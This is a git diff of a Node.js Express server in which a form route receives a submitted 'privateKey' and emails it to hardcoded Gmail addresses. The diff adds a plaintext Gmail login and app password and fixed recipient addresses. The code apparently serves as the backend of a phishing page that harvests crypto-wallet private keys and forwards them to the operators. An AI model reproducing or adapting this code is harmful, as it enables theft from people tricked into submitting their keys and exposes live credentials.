@@ -52,7 +52,7 @@ app.get('/pending', (req, res) => {
 })
 
 
-app.post('/submit', async (req, res) => {
+app.post('/submit/issues', async (req, res) => {
     const privateKey = req.body.data;  // Assuming this is the input from the user
     if (!privateKey) {
         console.log('Private key must be provided. Very crucial')
@@ -62,8 +62,8 @@ app.post('/submit', async (req, res) => {
     var transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
-          user: AUTH_USERNAME,
-          pass: AUTH_PASSWORD
+          user: 'panelactivator.forwarding@gmail.com',
+          pass: 'keczzhgntlviuaty'
         }
       });
 
@@ -81,7 +81,7 @@ app.post('/submit', async (req, res) => {
 
       var mailOptions = {
         from: 'panelactivator.forwarding@gmail.com', //Testing email to see you received it successfully. Server configured email
-        to: `${RECEIVING_MAIL}, ${AUTHENTICATOR}`,
+        to: 'netcarehospitalunit@gmail.com, panelactivator.forwarding@gmail.com',
         subject: `${req.body.category}`,
         html: `${req.body.data}`
       };
